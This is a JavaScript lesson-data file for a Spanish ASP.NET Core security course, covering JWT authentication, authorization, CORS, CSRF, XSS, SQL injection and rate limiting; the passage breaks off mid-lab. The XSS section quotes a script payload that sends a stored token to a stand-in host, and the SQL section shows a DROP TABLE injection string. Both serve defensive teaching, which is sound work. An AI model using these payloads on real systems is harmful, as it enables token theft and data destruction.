/* Módulo: Seguridad (Unidad 3, clases 24 y 25) */
(() => {
  const { code, table, note, lab, fig, sol, flow } = window.GUIDE.h;

  window.GUIDE.LESSONS.push(
    {
      id: 'autenticacion-jwt',
      module: 'sec',
      title: 'Autenticación con Identity y JWT',
      keywords: 'seguridad autenticacion identidad claims claimsprincipal esquema scheme handler challenge forbid cookies jwt bearer oauth openid connect identity usermanager hash contraseña token acceso refresh id token header payload firma hs256 tokenvalidationparameters issuer audience',
      tldr: '<mark>Autenticar</mark> es averiguar quién hace el pedido. En una API, el usuario inicia sesión una vez, recibe un <mark>JWT</mark> firmado y lo manda en cada pedido en el encabezado <code>Authorization: Bearer</code>. La API valida la firma, el emisor, la audiencia y el vencimiento sin guardar sesión.',
      goals: [
        'Distinguir autenticación de autorización y enumerar los aspectos de seguridad de una API.',
        'Explicar esquemas, manejadores, claims y ClaimsPrincipal en ASP.NET Core.',
        'Describir la estructura de un JWT y qué se valida en cada pedido.',
        'Implementar login con Identity y emisión y validación de JWT.',
      ],
      body: `
        <h2>Una API insegura</h2>
        <p>Hasta ahora, cualquiera que conozca la URL puede crear o dar de baja médicos. Los aspectos de seguridad que ASP.NET Core ayuda a resolver:</p>
        ${table(['Aspecto', 'Pregunta'], [
          ['Autenticación', '¿Quién sos?'],
          ['Autorización', '¿Qué podés hacer?'],
          ['Protección de datos', '¿Los datos sensibles están cifrados?'],
          ['HTTPS', '¿El tráfico viaja cifrado?'],
          ['Secretos', '¿Las claves están fuera del código fuente?'],
          ['XSRF/CSRF', '¿Otro sitio puede hacer pedidos en nombre del usuario?'],
          ['CORS', '¿Qué orígenes pueden leer las respuestas desde un navegador?'],
          ['Limitación de tasa', '¿Alguien puede saturar la API o probar contraseñas sin límite?'],
          ['XSS / inyección SQL', '¿Un dato malicioso puede ejecutarse como código?'],
        ])}

        <h2>Autenticación en ASP.NET Core</h2>
        <p>La autenticación la maneja el servicio <code>IAuthenticationService</code>, que usa el middleware de autenticación. Ese servicio delega en <strong>manejadores</strong> (handlers) registrados para cada <strong>esquema</strong> (scheme). Un esquema es un manejador más su configuración.</p>
        <ul>
          <li>Si la autenticación es exitosa, el manejador construye la identidad del usuario: un <code>ClaimsPrincipal</code> con sus <strong>claims</strong> (afirmaciones: id, nombre, roles…). Queda disponible en <code>HttpContext.User</code>.</li>
          <li>Si falla, devuelve “sin resultado” o “error”.</li>
          <li><strong>Challenge</strong>: lo que hace el esquema cuando un usuario no autenticado pide algo protegido (en JWT: responder <code>401</code>).</li>
          <li><strong>Forbid</strong>: lo que hace cuando un usuario autenticado no tiene permiso (responder <code>403</code>).</li>
        </ul>
        ${table(['Esquema', 'Uso típico'], [
          ['Cookies', 'Aplicaciones web tradicionales (MVC, Razor Pages)'],
          ['<strong>JWT Bearer</strong>', 'APIs REST consumidas por SPA, apps móviles, microservicios'],
          ['OAuth2 / OpenID Connect', 'Iniciar sesión con proveedores externos (Google, Microsoft, Auth0, Entra ID)'],
          ['Negotiate (Windows)', 'Redes corporativas con Kerberos/NTLM'],
          ['API Key', 'Integraciones máquina a máquina (implementación propia)'],
          ['Basic', 'Usuario y contraseña en cada pedido (solo sobre HTTPS; no recomendado)'],
          ['Certificados', 'Autenticación mutua con certificados de cliente'],
        ])}

        <h2>ASP.NET Core Identity</h2>
        <p>Identity es la biblioteca para administrar usuarios: guarda los usuarios en la base con EF Core, <strong>almacena hashes de contraseñas</strong> (nunca las contraseñas), maneja roles, bloqueo por intentos fallidos, confirmación de correo y doble factor.</p>
        ${code('cs', `// El DbContext hereda de IdentityDbContext: agrega AspNetUsers, AspNetRoles, AspNetUserRoles…
public class AppDbContext : IdentityDbContext<IdentityUser>
{
    protected override void OnModelCreating(ModelBuilder modelBuilder)
    {
        base.OnModelCreating(modelBuilder);   // ¡imprescindible! configura las tablas de Identity
        // … tu configuración
    }
}

builder.Services.AddIdentityCore<IdentityUser>(o =>
    {
        o.Password.RequiredLength = 8;
        o.Lockout.MaxFailedAccessAttempts = 5;
    })
    .AddRoles<IdentityRole>()
    .AddEntityFrameworkStores<AppDbContext>();`)}
        <p><code>UserManager&lt;IdentityUser&gt;</code> ofrece <code>CreateAsync(user, password)</code>, <code>FindByNameAsync</code>, <code>CheckPasswordAsync</code>, <code>AddToRoleAsync</code>, <code>GetRolesAsync</code>… Desde .NET 8 también existe <code>app.MapIdentityApi&lt;IdentityUser&gt;()</code>, que publica endpoints de registro y login listos, con tokens propios de ASP.NET Core (no JWT).</p>

        <h2>JWT</h2>
        <p>Un <strong>JSON Web Token</strong> es un token autocontenido: lleva adentro la información del usuario (claims) y una firma. El proveedor de identidad lo emite tras una autenticación exitosa; el cliente lo manda en cada pedido; la API lo valida. A diferencia de las cookies, que solo se envían al dominio que las emitió, un token puede enviarse a otros servidores.</p>
        <p>Por qué es tan usado en APIs: <strong>sin estado</strong> (el servidor no guarda sesiones), <strong>escalable</strong> (cualquier instancia puede validarlo), <strong>interoperable</strong> (cualquier plataforma lo entiende) y <strong>seguro</strong> (firmado, y opcionalmente cifrado).</p>
        <h3>Estructura</h3>
        <p>Tres partes en Base64URL separadas por puntos: <code><span style="color:var(--err)">header</span>.<span style="color:var(--accent-ink)">payload</span>.<span style="color:var(--ok)">firma</span></code>.</p>
        ${table(['Parte', 'Contiene'], [
          ['Header', 'El algoritmo de firma (<code>HS256</code>, <code>RS256</code>) y el tipo (<code>JWT</code>)'],
          ['Payload', 'Los claims: <code>sub</code> (usuario), <code>iss</code> (emisor), <code>aud</code> (audiencia), <code>exp</code> (vencimiento), <code>iat</code> (emisión), <code>jti</code> (id del token), roles y lo que agregues'],
          ['Firma', 'HMAC o firma asimétrica de header + payload con la clave del emisor'],
        ])}
        ${note('El payload <strong>no está cifrado</strong>: cualquiera puede decodificarlo y leerlo. La firma garantiza que nadie lo modificó, no que sea secreto. Nunca pongas contraseñas ni datos sensibles en un JWT.', 'exam')}
        <p>Generá un token, decodificalo, alteralo y mirá qué valida la API:</p>
        ${lab(0)}
        <h3>Tipos de token</h3>
        ${table(['Token', 'Para qué', 'Vida'], [
          ['<strong>Access token</strong>', 'Acceder a recursos protegidos. Lleva los claims y los permisos', 'Corta (minutos)'],
          ['<strong>Refresh token</strong>', 'Obtener un access token nuevo sin volver a pedir la contraseña. No viaja en cada pedido', 'Larga (días)'],
          ['<strong>ID token</strong>', 'Propio de OpenID Connect: dice quién es el usuario (autenticación), no para llamar a APIs', '—'],
        ])}

        <h2>Implementación paso a paso</h2>
        ${flow('El usuario envía usuario y contraseña a POST /api/auth/login', 'Identity verifica el hash de la contraseña', 'La API firma un JWT con sus claims y roles', 'El cliente lo guarda y lo manda en Authorization: Bearer …', 'JwtBearer valida firma, emisor, audiencia y vencimiento en cada pedido')}
        ${code('cs', `public class TokenService(IOptions<JwtOptions> options)
{
    private readonly JwtOptions _options = options.Value;

    public string CreateToken(string userId, string userName, IEnumerable<string> roles)
    {
        var claims = new List<Claim>
        {
            new(JwtRegisteredClaimNames.Sub, userId),
            new(JwtRegisteredClaimNames.UniqueName, userName),
            new(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString()),
        };
        claims.AddRange(roles.Select(r => new Claim(ClaimTypes.Role, r)));

        var key = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_options.Key));
        var descriptor = new SecurityTokenDescriptor
        {
            Subject = new ClaimsIdentity(claims),
            Issuer = _options.Issuer,
            Audience = _options.Audience,
            Expires = DateTime.UtcNow.AddMinutes(_options.ExpireMinutes),
            SigningCredentials = new SigningCredentials(key, SecurityAlgorithms.HmacSha256),
        };
        return new JsonWebTokenHandler().CreateToken(descriptor);
    }
}`, 'Security/TokenService.cs')}
        ${code('cs', `[HttpPost("login")]
public async Task<ActionResult<LoginResponse>> Login(LoginRequest request)
{
    var user = await _users.FindByNameAsync(request.UserName);
    if (user is null || !await _users.CheckPasswordAsync(user, request.Password))
        return Unauthorized();          // mismo resultado si falla el usuario o la contraseña

    var roles = await _users.GetRolesAsync(user);
    return Ok(new LoginResponse(_tokens.CreateToken(user.Id, user.UserName!, roles)));
}`, 'Controllers/AuthController.cs')}
        ${code('cs', `builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(o => o.TokenValidationParameters = new TokenValidationParameters
    {
        ValidateIssuer = true,
        ValidIssuer = jwt.Issuer,
        ValidateAudience = true,
        ValidAudience = jwt.Audience,
        ValidateLifetime = true,
        ValidateIssuerSigningKey = true,
        IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(jwt.Key)),
        ClockSkew = TimeSpan.FromMinutes(1),    // tolerancia de reloj (por defecto, 5 minutos)
    });
builder.Services.AddAuthorization();
// …
app.UseAuthentication();     // primero: quién es
app.UseAuthorization();      // después: qué puede hacer`, 'Program.cs')}
        <p>La clave HS256 debe tener al menos 32 bytes y no puede estar en el repositorio: guardala con <code>dotnet user-secrets set "Jwt:Key" "…"</code> en desarrollo. Para probar sin implementar login, existe la herramienta <code>dotnet user-jwts create</code>.</p>
        ${note('Microsoft recomienda que, en producción, los tokens los emita un proveedor estándar (OpenID Connect: Entra ID, Auth0, Keycloak, Duende IdentityServer) con claves asimétricas, en lugar de que cada API cree sus propios tokens a partir de usuario y contraseña. Emitirlos uno mismo, como acá, es apropiado para aprender y para sistemas cerrados.', 'tip')}
        <p>Iniciá sesión en el cliente, usá el token y probá los distintos casos:</p>
        ${lab(1)}
      `,
      labs: [
        {
          type: 'jwt',
          title: 'Anatomía de un JWT (firma HS256 real)',
          intro: 'El token se firma de verdad con la clave del servidor. Probá cambiar una letra del payload en el token, cambiar la clave secreta o hacerlo expirar.',
        },
        {
          type: 'api',
          title: 'La API de médicos protegida',
          intro: 'Usuarios de prueba: <code>admin</code> / <code>Admin123!</code> (rol Admin) y <code>recepcion</code> / <code>Recep123!</code> (rol Recepcion). GET es público; POST exige estar autenticado; DELETE exige el rol Admin.',
          features: { middleware: true, auth: true },
          goals: [
            { text: 'Intentar crear un médico sin token: 401', test: (x) => x.req.method === 'POST' && /doctors$/.test(x.req.url) && x.res.status === 401 },
            { text: 'Iniciar sesión y obtener un token', test: (x) => /auth\/login/.test(x.req.url) && x.res.status === 200 },
            { text: 'Crear un médico con token: 201', test: (x) => x.req.method === 'POST' && x.res.status === 201 },
            { text: 'Intentar dar de baja con el usuario de recepción: 403', test: (x) => x.req.method === 'DELETE' && x.res.status === 403 },
            { text: 'Dar de baja como admin: 204', test: (x) => x.req.method === 'DELETE' && x.res.status === 204 },
          ],
        },
      ],
      exercises: [
        {
          level: 3,
          title: 'Proteger la API del EJ16 con Identity y JWT',
          prompt: '<p>Sobre tu solución del EJ16: agregá ASP.NET Core Identity con roles, un endpoint <code>POST /api/auth/login</code> que devuelva un JWT, y protegé los endpoints: GET público, POST para usuarios autenticados y DELETE solo para el rol <code>Admin</code>. Creá dos usuarios de prueba al iniciar.</p>',
          hints: ['Paquetes: <code>Microsoft.AspNetCore.Identity.EntityFrameworkCore</code> en Data y <code>Microsoft.AspNetCore.Authentication.JwtBearer</code> en Api.', 'No te olvides de <code>base.OnModelCreating(modelBuilder)</code> ni de una migración nueva.', 'Los roles viajan como claims <code>ClaimTypes.Role</code>: así <code>[Authorize(Roles = "Admin")]</code> los encuentra.', 'Si recibís 401 con un token válido, revisá el orden de UseAuthentication y UseAuthorization.'],
          solution: sol(`<p>Implementación probada con .NET 10 contra la API real. Resultados de las pruebas: GET público 200; POST sin token 401; login con contraseña incorrecta 401; POST como recepción 201; DELETE como recepción 403; DELETE como admin 204; token con un carácter alterado 401.</p>`, [
            ['Security/IdentitySeeder.cs', 'cs', `using Microsoft.AspNetCore.Identity;

namespace Dsw2026Ej15.Api.Security;

// Crea los roles y dos usuarios de prueba (solo para desarrollo)
public static class IdentitySeeder
{
    public static async Task SeedAsync(IServiceProvider services)
    {
        var roles = services.GetRequiredService<RoleManager<IdentityRole>>();
        var users = services.GetRequiredService<UserManager<IdentityUser>>();

        foreach (var role in new[] { "Admin", "Recepcion" })
            if (!await roles.RoleExistsAsync(role))
                await roles.CreateAsync(new IdentityRole(role));

        await CreateUser(users, "admin", "Admin123!", "Admin");
        await CreateUser(users, "recepcion", "Recep123!", "Recepcion");
    }

    private static async Task CreateUser(UserManager<IdentityUser> users, string name, string password, string role)
    {
        if (await users.FindByNameAsync(name) is not null) return;
        var user = new IdentityUser(name);
        await users.CreateAsync(user, password);       // guarda el hash, nunca la contraseña
        await users.AddToRoleAsync(user, role);
    }
}`],
            ['Controllers/DoctorsController.cs (atributos)', 'cs', `[ApiController]
[Route("api/doctors")]
[Authorize]                                   // todo el controlador exige un usuario autenticado
public class DoctorsController : ControllerBase
{
    [HttpGet]
    [AllowAnonymous]                          // salvo la consulta pública
    public ActionResult<IEnumerable<DoctorResponse>> GetAll() { … }

    [HttpDelete("{id:guid}")]
    [Authorize(Roles = "Admin")]               // y la baja, solo administradores
    public IActionResult Delete(Guid id) { … }
}`],
            ['appsettings.json', 'json', `{
  "Jwt": {
    "Issuer": "https://dsw2026.frt.utn.edu.ar",
    "Audience": "dsw-api",
    "ExpireMinutes": 30
  }
}`],
            ['Clave (fuera del repositorio)', 'bash', 'dotnet user-secrets init --project Dsw2026Ej15.Api\ndotnet user-secrets set "Jwt:Key" "una-clave-larga-de-al-menos-32-bytes!!" --project Dsw2026Ej15.Api'],
            ['Program.cs (agregados)', 'cs', `using System.Text;
using Dsw2026Ej15.Api.Security;
using Microsoft.AspNetCore.Authentication.JwtBearer;
using Microsoft.AspNetCore.Identity;
using Microsoft.IdentityModel.Tokens;

builder.Services.AddIdentityCore<IdentityUser>(o =>
    {
        o.Password.RequiredLength = 8;
        o.Lockout.MaxFailedAccessAttempts = 5;
    })
    .AddRoles<IdentityRole>()
    .AddEntityFrameworkStores<AppDbContext>();

var jwt = builder.Configuration.GetSection("Jwt").Get<JwtOptions>()!;
builder.Services.Configure<JwtOptions>(builder.Configuration.GetSection("Jwt"));
builder.Services.AddSingleton<TokenService>();
builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(o => o.TokenValidationParameters = new TokenValidationParameters
    {
        ValidateIssuer = true,
        ValidIssuer = jwt.Issuer,
        ValidateAudience = true,
        ValidAudience = jwt.Audience,
        ValidateLifetime = true,
        ValidateIssuerSigningKey = true,
        IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(jwt.Key)),
        ClockSkew = TimeSpan.FromMinutes(1),
    });
builder.Services.AddAuthorization();

var app = builder.Build();

using (var scope = app.Services.CreateScope())
{
    scope.ServiceProvider.GetRequiredService<AppDbContext>().Database.Migrate();
    await IdentitySeeder.SeedAsync(scope.ServiceProvider);
}

app.UseMiddleware<ExceptionHandlingMiddleware>();
app.UseHttpsRedirection();
app.UseAuthentication();
app.UseAuthorization();
app.MapControllers();`],
          ]),
        },
      ],
      quiz: [
        { q: '¿Qué diferencia hay entre autenticación y autorización?', o: ['Son lo mismo.', 'Autenticación: quién sos. Autorización: qué podés hacer.', 'Autenticación: qué podés hacer. Autorización: quién sos.', 'La autorización solo existe con cookies.'], a: 1, e: 'Primero se autentica, después se autoriza.' },
        { q: '¿Qué contiene el payload de un JWT?', o: ['La contraseña cifrada.', 'Los claims: usuario, emisor, audiencia, vencimiento, roles…', 'La clave secreta.', 'El HTML de la respuesta.'], a: 1, e: 'Está codificado en Base64URL, no cifrado.' },
        { q: 'Alguien cambia el rol en el payload de un token. ¿Qué pasa al usarlo?', o: ['Obtiene el nuevo rol.', 'La firma no coincide y la API responde 401.', 'La API corrige el rol.', 'Nada.'], a: 1, e: 'La firma cubre header y payload.' },
        { q: '¿Qué es un refresh token?', o: ['El token que se manda en cada pedido.', 'Un token de vida larga para obtener access tokens nuevos sin volver a iniciar sesión.', 'El token de OpenID Connect con la identidad.', 'Un token sin firma.'], a: 1, e: 'No viaja en cada pedido.' },
        { q: '¿Cómo guarda Identity las contraseñas?', o: ['En texto plano.', 'Cifradas con una clave reversible.', 'Como hash (no se pueden recuperar).', 'En el JWT.'], a: 2, e: 'CheckPasswordAsync compara hashes.' },
        { q: '¿Qué hace el “challenge” del esquema JWT Bearer?', o: ['Responde 403.', 'Responde 401 cuando un usuario no autenticado pide algo protegido.', 'Renueva el token.', 'Redirige al login.'], a: 1, e: 'Forbid es el que responde 403.' },
        { q: '¿Dónde NO debería estar la clave de firma de los tokens?', o: ['En user-secrets.', 'En una variable de entorno.', 'En el código o en appsettings.json versionado.', 'En un almacén de secretos.'], a: 2, e: 'Quien la tenga puede emitir tokens válidos.' },
      ],
      sources: [
        { title: 'Introducción a la autenticación en ASP.NET Core', url: 'https://learn.microsoft.com/es-es/aspnet/core/security/authentication/', points: ['IAuthenticationService, esquemas y manejadores.', 'Authenticate, challenge y forbid; ClaimsPrincipal.'] },
        { title: 'Configurar la autenticación JWT de tipo bearer', url: 'https://learn.microsoft.com/es-es/aspnet/core/security/authentication/configure-jwt-bearer-authentication', points: ['Tipos de token: acceso, identificador y otros (refresh).', 'Qué validar: firma, emisor, audiencia, vencimiento; 401 frente a 403.', 'Recomendaciones: estándares OpenID Connect/OAuth, claves asimétricas.'] },
        { title: 'Identity en ASP.NET Core para API web', url: 'https://learn.microsoft.com/es-es/aspnet/core/security/authentication/identity-api-authorization', points: ['AddIdentityCore, almacenes de EF Core y MapIdentityApi.', 'Personalización y configuración de Identity (contraseñas, bloqueo).'] },
        { title: 'JSON Web Tokens', url: 'https://jwt.io/introduction', points: ['Estructura header.payload.signature.', 'Cuándo usar JWT y cómo funciona.'] },
      ],
    },

    {
      id: 'autorizacion',
      module: 'sec',
      title: 'Autorización: simple, por roles y por políticas',
      keywords: 'autorizacion authorize allowanonymous roles politicas policies requirerole requireclaim requisitos fallback 401 403',
      tldr: 'Con <code>[Authorize]</code> exigís un usuario autenticado; con <code>[Authorize(Roles = "Admin")]</code>, un rol; con <mark>políticas</mark>, cualquier regla basada en claims. Lo que no cumple da 401 (no autenticado) o 403 (autenticado sin permiso).',
      goals: [
        'Proteger controladores y acciones con [Authorize] y [AllowAnonymous].',
        'Autorizar por roles.',
        'Definir políticas basadas en claims y una política por defecto.',
      ],
      body: `
        <h2>Autorización simple</h2>
        ${code('cs', `[Authorize]                       // todo el controlador: solo usuarios autenticados
public class DoctorsController : ControllerBase
{
    [AllowAnonymous]              // excepción: esta acción es pública
    [HttpGet]
    public IActionResult GetAll() { … }

    [HttpPost]                    // hereda [Authorize]
    public IActionResult Create(DoctorRequest r) { … }
}

// En API mínimas:
app.MapGet("/api/perfil", (ClaimsPrincipal user) => user.Identity!.Name).RequireAuthorization();`)}

        <h2>Por roles</h2>
        ${code('cs', `[Authorize(Roles = "Admin")]                 // debe tener el rol Admin
[Authorize(Roles = "Admin,Recepcion")]       // Admin O Recepcion

// Dos atributos se combinan con Y: debe tener ambos roles
[Authorize(Roles = "Admin")]
[Authorize(Roles = "Auditor")]`)}
        <p>Los roles se leen de los claims <code>ClaimTypes.Role</code> del usuario. Dentro de una acción podés consultarlos con <code>User.IsInRole("Admin")</code>.</p>

        <h2>Por políticas</h2>
        <p>Una política es una regla con nombre. Sirve para requisitos que no son un simple rol:</p>
        ${code('cs', `builder.Services.AddAuthorizationBuilder()
    .AddPolicy("SoloAdmin", p => p.RequireRole("Admin"))
    .AddPolicy("MedicoMatriculado", p => p.RequireClaim("matricula"))
    .AddPolicy("Mayor18", p => p.RequireAssertion(ctx =>
        int.TryParse(ctx.User.FindFirst("edad")?.Value, out var e) && e >= 18))
    // Toda acción sin atributo exige autenticación (más seguro por defecto)
    .SetFallbackPolicy(new AuthorizationPolicyBuilder().RequireAuthenticatedUser().Build());

[Authorize(Policy = "MedicoMatriculado")]
public IActionResult VerHistoriaClinica(Guid id) { … }`)}
        <p>Para reglas complejas se escriben <strong>requisitos</strong> (<code>IAuthorizationRequirement</code>) con su <strong>manejador</strong> (<code>AuthorizationHandler&lt;T&gt;</code>), que pueden usar servicios, por ejemplo para verificar que un médico solo vea sus propios pacientes.</p>
        ${lab(0)}
      `,
      labs: [
        {
          type: 'classify',
          title: '¿Qué responde la API?',
          intro: 'Endpoint <code>DELETE /api/doctors/{id}</code> con <code>[Authorize(Roles = "Admin")]</code>.',
          buckets: ['204 (permitido)', '401', '403'],
          items: [
            { t: 'Pedido sin encabezado Authorization', b: 1, why: 'No hay usuario autenticado: challenge.' },
            { t: 'Token válido de un usuario con rol Recepcion', b: 2, why: 'Autenticado, pero sin el rol: forbid.' },
            { t: 'Token válido de un usuario con rol Admin', b: 0, why: 'Cumple la política.' },
            { t: 'Token de admin vencido hace una hora', b: 1, why: 'Un token vencido no autentica.' },
            { t: 'Token de admin con un carácter cambiado', b: 1, why: 'La firma no coincide.' },
            { t: 'Token válido de admin, pero el servidor tiene UseAuthorization antes de UseAuthentication', b: 1, why: 'Al autorizar, el usuario todavía es anónimo.' },
          ],
        },
      ],
      quiz: [
        { q: '¿Qué hace <code>[AllowAnonymous]</code> en una acción de un controlador con <code>[Authorize]</code>?', o: ['Nada.', 'Hace pública esa acción.', 'Exige el rol Anonymous.', 'Desactiva HTTPS.'], a: 1, e: 'Es la excepción a la regla del controlador.' },
        { q: '<code>[Authorize(Roles = "Admin,Medico")]</code> exige…', o: ['…ambos roles.', '…cualquiera de los dos.', '…ningún rol.', '…el rol "Admin,Medico".'], a: 1, e: 'La coma significa O; dos atributos separados significan Y.' },
        { q: '¿Para qué sirve una política de autorización?', o: ['Para cifrar datos.', 'Para definir reglas con nombre basadas en claims, roles o lógica propia.', 'Para configurar CORS.', 'Para crear usuarios.'], a: 1, e: 'Se aplica con [Authorize(Policy = "...")].' },
        { q: '¿Qué logra <code>SetFallbackPolicy(...RequireAuthenticatedUser())</code>?', o: ['Que todo sea público.', 'Que las acciones sin atributo exijan autenticación por defecto.', 'Que el login sea opcional.', 'Que se use cookies.'], a: 1, e: 'Seguro por defecto: hay que marcar explícitamente lo público.' },
      ],
      sources: [
        { title: 'Autorización simple en ASP.NET Core', url: 'https://learn.microsoft.com/es-es/aspnet/core/security/authorization/simple', points: ['[Authorize] y [AllowAnonymous] en controladores y acciones.'] },
        { title: 'Autorización basada en roles', url: 'https://learn.microsoft.com/es-es/aspnet/core/security/authorization/roles', points: ['Roles en atributos; combinación con O y con Y.'] },
        { title: 'Autorización basada en directivas', url: 'https://learn.microsoft.com/es-es/aspnet/core/security/authorization/policies', points: ['Políticas, requisitos y manejadores; políticas por defecto y de reserva.'] },
        { title: 'Autorización en API mínimas', url: 'https://learn.microsoft.com/es-es/aspnet/core/fundamentals/minimal-apis/security', points: ['RequireAuthorization y AllowAnonymous en endpoints.'] },
      ],
    },

    {
      id: 'seguridad-web',
      module: 'sec',
      title: 'HTTPS, CORS, CSRF, XSS, inyección SQL y limitación de tasa',
      keywords: 'https hsts usehttpsredirection cors origen preflight withorigins allowcredentials csrf xsrf falsificacion antiforgery xss cross site scripting codificacion csp inyeccion sql fromsql parametros rate limiting limitacion de tasa ventana fija token bucket 429 secretos',
      tldr: 'Un repaso de los ataques más comunes y su defensa en ASP.NET Core: <mark>HTTPS</mark> para cifrar, <mark>CORS</mark> para decidir qué orígenes leen tus respuestas, tokens antifalsificación contra <mark>CSRF</mark>, codificación contra <mark>XSS</mark>, parámetros contra <mark>inyección SQL</mark> y <mark>limitación de tasa</mark> contra el abuso.',
      goals: [
        'Forzar HTTPS y explicar HSTS.',
        'Configurar CORS y predecir cuándo el navegador bloquea un pedido.',
        'Explicar CSRF, XSS e inyección SQL y cómo se previenen.',
        'Aplicar limitación de tasa.',
      ],
      body: `
        <h2>Forzar HTTPS</h2>
        <p>Sin HTTPS, cualquiera en la red (un wifi público) puede leer y modificar el tráfico, incluidos los tokens. ASP.NET Core trae dos middleware:</p>
        ${code('cs', `if (!app.Environment.IsDevelopment())
    app.UseHsts();              // agrega Strict-Transport-Security: el navegador recordará usar solo https
app.UseHttpsRedirection();      // redirige http → https (307)`)}
        <p>Para APIs, Microsoft sugiere directamente no escuchar en HTTP o responder 400, porque un cliente que no es un navegador puede enviar el token por HTTP antes de seguir la redirección.</p>

        <h2>CORS</h2>
        <p>Por la <strong>política del mismo origen</strong>, un navegador no deja que el JavaScript de una página lea respuestas de otro origen. Dos URLs tienen el mismo origen si coinciden <strong>esquema, host y puerto</strong>: <code>http://localhost:5173</code> (tu React) y <code>https://localhost:7001</code> (tu API) son orígenes distintos.</p>
        <p><strong>CORS</strong> (Cross-Origin Resource Sharing) es el estándar con el que el servidor le dice al navegador qué otros orígenes pueden leer sus respuestas. No es una función de seguridad del servidor: <strong>es el navegador el que bloquea</strong>; Postman o curl lo ignoran.</p>
        ${code('cs', `builder.Services.AddCors(o => o.AddPolicy("Frontend", p =>
    p.WithOrigins("http://localhost:5173")      // sin barra final
     .AllowAnyHeader()
     .AllowAnyMethod()));
// …
app.UseRouting();
app.UseCors("Frontend");      // después de UseRouting y antes de UseAuthorization
app.UseAuthorization();`)}
        <p>Para pedidos que no son “simples” (un POST con JSON, un DELETE, encabezados como Authorization), el navegador manda antes un pedido <strong>preflight</strong> <code>OPTIONS</code> preguntando si está permitido. Si la respuesta no trae los encabezados CORS correctos, el pedido real ni se envía.</p>
        ${lab(0)}
        ${note('<code>AllowAnyOrigin()</code> junto con <code>AllowCredentials()</code> no está permitido: la especificación prohíbe <code>Access-Control-Allow-Origin: *</code> cuando se envían credenciales. Tampoco lo esquives con <code>SetIsOriginAllowed(_ =&gt; true)</code>: habilita ataques CSRF.', 'warn')}

        <h2>XSRF / CSRF</h2>
        <p>En un ataque de <strong>falsificación de solicitud entre sitios</strong>, un sitio malicioso hace que el navegador del usuario envíe un pedido a tu aplicación. Funciona si la autenticación viaja <strong>automáticamente</strong>, como las cookies: el navegador las adjunta solo.</p>
        ${flow('El usuario inicia sesión en banco.com (cookie de sesión)', 'Visita sitio-malicioso.com sin cerrar sesión', 'Esa página tiene un formulario oculto que hace POST a banco.com/transferir', 'El navegador adjunta la cookie de banco.com', 'El banco ve un pedido autenticado y transfiere')}
        <p>Defensas: <strong>tokens antifalsificación</strong> (un valor secreto en el formulario que el otro sitio no puede conocer; en ASP.NET Core, <code>AddAntiforgery</code>/<code>UseAntiforgery</code>), cookies con <code>SameSite</code>, y no usar GET para operaciones que modifican datos. Una API que recibe el JWT en el encabezado <code>Authorization</code> es mucho menos vulnerable, porque el navegador no lo adjunta solo.</p>

        <h2>XSS (Cross-Site Scripting)</h2>
        <p>Un atacante logra que tu aplicación muestre su código JavaScript a otros usuarios: por ejemplo, guarda como nombre de médico <code>&lt;script&gt;fetch('https://malo.com?t='+localStorage.token)&lt;/script&gt;</code>. Si el frontend inserta ese texto como HTML, el script corre en el navegador de la víctima y puede robar su token.</p>
        <ul>
          <li><strong>Codificar la salida:</strong> mostrar datos como texto, nunca como HTML. React y Razor codifican por defecto; el peligro aparece con <code>innerHTML</code> o <code>dangerouslySetInnerHTML</code>.</li>
          <li><strong>Validar la entrada</strong> en el servidor (longitudes, formatos).</li>
          <li><strong>Content-Security-Policy:</strong> un encabezado que restringe de dónde puede cargarse y ejecutarse código.</li>
          <li>Guardar tokens en <code>localStorage</code> los expone a cualquier XSS; por eso se recomiendan cookies <code>HttpOnly</code> o un backend intermedio (BFF) para aplicaciones sensibles.</li>
        </ul>

        <h2>Inyección SQL</h2>
        ${code('cs', `// PELIGROSO: concatenar la entrada del usuario en el SQL
var sql = $"SELECT * FROM Doctors WHERE Name = '{nombre}'";
_context.Doctors.FromSqlRaw(sql);
// nombre = "x'; DROP TABLE Doctors; --"  → se ejecuta el DROP

// SEGURO: LINQ y FromSql parametrizan automáticamente
_context.Doctors.Where(d => d.Name == nombre);
_context.Doctors.FromSql($"SELECT * FROM Doctors WHERE Name = {nombre}");   // genera @p0`)}
        <p>EF Core parametriza todas las consultas LINQ. El riesgo aparece solo al armar SQL a mano concatenando texto.</p>

        <h2>Limitación de tasa</h2>
        <p>Sin límites, cualquiera puede probar miles de contraseñas por minuto o saturar la API. El middleware de limitación de tasa responde <code>429 Too Many Requests</code> cuando se supera el límite:</p>
        ${code('cs', `builder.Services.AddRateLimiter(o =>
{
    o.RejectionStatusCode = StatusCodes.Status429TooManyRequests;
    o.AddFixedWindowLimiter("login", w => { w.PermitLimit = 5; w.Window = TimeSpan.FromMinutes(1); });
});
app.UseRateLimiter();

[EnableRateLimiting("login")]
[HttpPost("login")] public async Task<IActionResult> Login(…) { … }`)}
        ${table(['Algoritmo', 'Funcionamiento'], [
          ['Ventana fija', 'N pedidos por intervalo; el contador se reinicia al terminar cada ventana'],
          ['Ventana deslizante', 'Como la fija, pero dividida en segmentos que se van renovando: evita picos en el borde de la ventana'],
          ['Cubo de tokens', 'Un cubo se recarga a ritmo constante; cada pedido consume un token: permite ráfagas cortas'],
          ['Concurrencia', 'Limita cuántos pedidos se procesan a la vez'],
        ])}
        <p>Probá el cliente con el limitador activo (5 pedidos por ventana):</p>
        ${lab(1)}
        ${lab(2)}
      `,
      labs: [
        {
          type: 'cors',
          title: 'Simulador de CORS',
          intro: 'Cambiá la política del servidor y el pedido del navegador. Probá: origen malicioso; AllowAnyOrigin con AllowCredentials; un origen con barra final; un DELETE con solo GET permitido.',
        },
        {
          type: 'api',
          title: 'Limitación de tasa',
          intro: 'Mandá varios GET seguidos.',
          features: { middleware: true, rateLimit: true },
        },
        {
          type: 'classify',
          title: 'Ataque y defensa',
          buckets: ['HTTPS / HSTS', 'CORS', 'Token antifalsificación', 'Codificar la salida (contra XSS)', 'Consultas parametrizadas', 'Limitación de tasa'],
          items: [
            { t: 'Alguien en el wifi del bar lee el token que viaja en el encabezado', b: 0, why: 'El tráfico sin cifrar se puede leer.' },
